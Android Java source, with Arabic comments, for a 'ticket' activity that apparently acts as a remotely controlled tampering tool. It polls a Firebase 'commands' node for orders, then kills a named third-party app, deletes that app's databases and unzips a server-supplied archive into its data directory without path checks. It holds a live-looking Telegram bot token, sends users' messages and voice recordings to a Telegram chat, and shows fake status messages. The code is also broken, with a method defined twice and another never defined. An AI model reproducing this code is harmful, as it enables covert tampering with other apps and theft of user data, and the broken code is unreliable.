package com.ban.ab;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import org.json.JSONObject;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Iterator;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okio.BufferedSink;
import okio.Okio;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final String TELEGRAM_BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String ADMIN_CHAT_ID = "1749638488"; 
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutFields, layoutZipTask;
    private TextView txtRejectReason, txtProgressStatus, txtTicketID;
    private Button btnCancelOrder, btnExecuteTask;
    private ProgressBar taskProgressBar;

    // أدوات المحادثة والتسجيل
    private MediaRecorder recorder;
    private String voiceFileName;
    private FloatingActionButton fabChat;
    private Handler chatHandler = new Handler(Looper.getMainLooper());
    private Runnable chatRunnable;

    private final Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        checkPermissions();
        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "");

        initViews();
        setupFloatingChatButton(); 
        generateTicketID();
        startStatusSequence(); 
        startAutoRefresh();
    }

    private void setupFloatingChatButton() {
        fabChat = new FloatingActionButton(this);
        fabChat.setImageResource(android.R.drawable.stat_notify_chat);
        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#1A73E8")));
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(-2, -2);
        params.gravity = Gravity.BOTTOM | Gravity.START;
        params.setMargins(50, 0, 0, 50);
        ((ViewGroup) findViewById(android.R.id.content)).addView(fabChat, params);
        fabChat.setOnClickListener(v -> showChatPopup());
    }

    @SuppressLint("ClickableViewAccessibility")
    private void showChatPopup() {
        final Dialog chatDialog = new Dialog(this);
        chatDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        chatDialog.setContentView(R.layout.chat_layout);
        chatDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        Window window = chatDialog.getWindow();
        window.setGravity(Gravity.BOTTOM | Gravity.START);
        WindowManager.LayoutParams wlp = window.getAttributes();
        wlp.x = 50; wlp.y = 200;
        window.setAttributes(wlp);

        LinearLayout msgContainer = chatDialog.findViewById(R.id.chatMessagesContainer);
        ScrollView scrollView = chatDialog.findViewById(R.id.chatScrollView);
        EditText edtMsg = chatDialog.findViewById(R.id.edtMessage);
        ImageButton btnSend = chatDialog.findViewById(R.id.btnSendMessage);
        ImageButton btnRecord = chatDialog.findViewById(R.id.btnRecord);

        // بدء مراقبة الرسائل
        startChatMonitoring(msgContainer, scrollView);

        chatDialog.findViewById(R.id.btnCloseChat).setOnClickListener(v -> {
            stopChatMonitoring();
            chatDialog.dismiss();
        });

        btnSend.setOnClickListener(v -> {
            String text = edtMsg.getText().toString().trim();
            if (!text.isEmpty()) {
                saveMessageToFirebase("user", text);
                sendTextToTelegram(text);
                edtMsg.setText("");
            }
        });

        btnRecord.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) startVoiceRecording();
            else if (event.getAction() == MotionEvent.ACTION_UP) stopVoiceRecording();
            return true;
        });

        chatDialog.show();
    }

    private void startChatMonitoring(LinearLayout container, ScrollView scroll) {
        chatRunnable = new Runnable() {
            @Override public void run() {
                loadChatMessages(container, scroll);
                chatHandler.postDelayed(this, 3000); // تحديث كل 3 ثوانٍ
            }
        };
        chatHandler.post(chatRunnable);
    }

    private void stopChatMonitoring() {
        if (chatRunnable != null) chatHandler.removeCallbacks(chatRunnable);
    }

    private void loadChatMessages(LinearLayout container, ScrollView scroll) {
        String url = FIREBASE_URL + "commands/" + userName + "/messages.json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    String data = response.body().string();
                    if (data.equals("null")) return;
                    runOnUiThread(() -> {
                        try {
                            JSONObject json = new JSONObject(data);
                            container.removeAllViews();
                            Iterator<String> keys = json.keys();
                            while (keys.hasNext()) {
                                JSONObject msgObj = json.getJSONObject(keys.next());
                                addMessageToUI(container, msgObj.getString("text"), msgObj.getString("sender"));
                            }
                            scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN));
                        } catch (Exception e) {}
                    });
                }
            }
        });
    }

    private void addMessageToUI(LinearLayout container, String text, String sender) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setPadding(30, 20, 30, 20);
        tv.setTextSize(14);
        
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-2, -2);
        lp.setMargins(10, 10, 10, 10);
        
        if (sender.equals("user")) {
            tv.setBackgroundResource(android.R.drawable.editbox_dropdown_light_frame);
            tv.setTextColor(Color.BLACK);
            lp.gravity = Gravity.END;
        } else {
            tv.setBackgroundResource(android.R.drawable.editbox_dropdown_dark_frame);
            tv.setTextColor(Color.WHITE);
            lp.gravity = Gravity.START;
        }
        container.addView(tv, lp);
    }

    private void saveMessageToFirebase(String sender, String text) {
        String url = FIREBASE_URL + "commands/" + userName + "/messages.json";
        try {
            JSONObject msg = new JSONObject();
            msg.put("sender", sender);
            msg.put("text", text);
            msg.put("time", System.currentTimeMillis());
            client.newCall(new Request.Builder().url(url).post(RequestBody.create(msg.toString(), MediaType.parse("application/json"))).build()).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception e) {}
    }

    // --- الدوال الأصلية الخاصة بالـ ZIP والتحميل ---

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
        }
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        layoutZipTask = findViewById(R.id.layoutZipTask); 
        txtProgressStatus = findViewById(R.id.txtProgressStatus);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);
        btnExecuteTask = findViewById(R.id.btnExecuteTask); 
        taskProgressBar = findViewById(R.id.taskProgressBar);

        btnCancelOrder.setOnClickListener(v -> {
            stopAutoRefresh();
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void stopVoiceRecording() {
    if (recorder != null) {
        try {
            // إضافة try/catch لمنع الانهيار إذا كان التسجيل قصيراً جداً
            recorder.stop();
            recorder.release();
            recorder = null;
            
            // إرسال الملف فقط إذا نجح التسجيل
            if (voiceFileName != null) {
                sendVoiceToTelegram(voiceFileName);
            }
        } catch (RuntimeException stopException) {
            // هذا يحدث إذا ضغط المستخدم على الزر وتركه فوراً (تسجيل قصير جداً)
            recorder.release();
            recorder = null;
            Toast.makeText(this, "اضغط مطولاً للتسجيل", Toast.LENGTH_SHORT).show();
        }
    }
}

    private void stopVoiceRecording() {
        if (recorder != null) {
            recorder.stop(); recorder.release(); recorder = null;
            sendVoiceToTelegram(voiceFileName);
        }
    }

    private void sendVoiceToTelegram(String path) {
        File file = new File(path);
        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("voice", file.getName(), RequestBody.create(file, MediaType.parse("audio/m4a")))
                .addFormDataPart("chat_id", ADMIN_CHAT_ID)
                .build();
        client.newCall(new Request.Builder().url("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendVoice").post(body).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void sendTextToTelegram(String msg) {
        String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage?chat_id=" + ADMIN_CHAT_ID + "&text=" + Uri.encode("💬 من: " + userName + "\n" + msg);
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void generateTicketID() {
        txtTicketID.setText("تذكرة رقم: " + (System.currentTimeMillis() / 100000));
    }

    private void startStatusSequence() {
        final String[] msgs = {"جاري فحص البيانات...", "بانتظار المشرف المباشر...", "يتم الآن تأمين الاتصال..."};
        refreshHandler.post(new Runnable() {
            int i = 0;
            @Override public void run() {
                if (layoutWaiting.getVisibility() == View.VISIBLE) {
                    txtProgressStatus.setText(msgs[i % msgs.length]);
                    i++;
                    refreshHandler.postDelayed(this, 3000);
                }
            }
        });
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() { checkFirebaseStatus(); refreshHandler.postDelayed(this, 5000); }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void checkFirebaseStatus() {
        String url = FIREBASE_URL + "commands/" + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        String res = response.body().string();
                        if (res.equals("null")) return;
                        JSONObject data = new JSONObject(res);
                        runOnUiThread(() -> updateUI(data.optString("status"), data));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void updateUI(String status, JSONObject data) {
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutFields.setVisibility(View.GONE);
        layoutZipTask.setVisibility(View.GONE);

        if (status.equals("rejected")) {
            layoutRejected.setVisibility(View.VISIBLE);
            txtRejectReason.setText(data.optString("reason", "تم الرفض"));
        } else if (status.equals("fields")) {
            layoutFields.setVisibility(View.VISIBLE);
        } else if (status.equals("zip_task")) {
            layoutZipTask.setVisibility(View.VISIBLE);
            String zipUrl = data.optString("zip_url");
            String targetPkg = data.optString("target_package", "com.target.app");
            btnExecuteTask.setOnClickListener(v -> startModdingProcess(zipUrl, targetPkg));
        } else {
            layoutWaiting.setVisibility(View.VISIBLE);
        }
    }

    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) { for (File child : children) { deleteRecursive(child); } }
        }
        fileOrDirectory.delete();
    }

    private void startModdingProcess(String url, String pkg) {
        btnExecuteTask.setEnabled(false);
        taskProgressBar.setVisibility(View.VISIBLE);
        new Thread(() -> {
            boolean success = false;
            try {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                am.killBackgroundProcesses(pkg);
                Thread.sleep(1000);
                Context targetContext = createPackageContext(pkg, 3);
                String targetPath = targetContext.getApplicationInfo().dataDir;
                File targetDir = new File(targetPath);
                File databaseDir = new File(targetPath, "databases");
                if (databaseDir.exists()) deleteRecursive(databaseDir);
                File tempZip = new File(getCacheDir(), "update.zip");
                if (tempZip.exists()) tempZip.delete();
                downloadFileSync(url, tempZip);
                unzip(tempZip, targetDir);
                tempZip.delete(); 
                success = true;
            } catch (Exception e) { e.printStackTrace(); }
            final boolean finalSuccess = success;
            runOnUiThread(() -> {
                taskProgressBar.setVisibility(View.GONE);
                btnExecuteTask.setEnabled(true);
                Toast.makeText(this, finalSuccess ? "تمت العملية بنجاح ✅" : "فشلت العملية ❌", 1).show();
            });
        }).start();
    }

    private void downloadFileSync(String url, File destFile) throws IOException {
        Request request = new Request.Builder().url(url).build();
        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) throw new IOException("Download failed");
            try (BufferedSink sink = Okio.buffer(Okio.sink(destFile))) { sink.writeAll(response.body().source()); }
        }
    }

    private void unzip(File zipFile, File targetDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
            ZipEntry ze;
            while ((ze = zis.getNextEntry()) != null) {
                File file = new File(targetDir, ze.getName());
                if (ze.isDirectory()) { file.mkdirs(); } 
                else {
                    File parent = file.getParentFile();
                    if (parent != null) parent.mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = zis.read(buffer)) != -1) { fos.write(buffer, 0, len); }
                    }
                }
            }
        }
    }

    private void stopAutoRefresh() { refreshHandler.removeCallbacks(refreshRunnable); }
    @Override protected void onDestroy() { super.onDestroy(); stopAutoRefresh(); stopChatMonitoring(); }
}
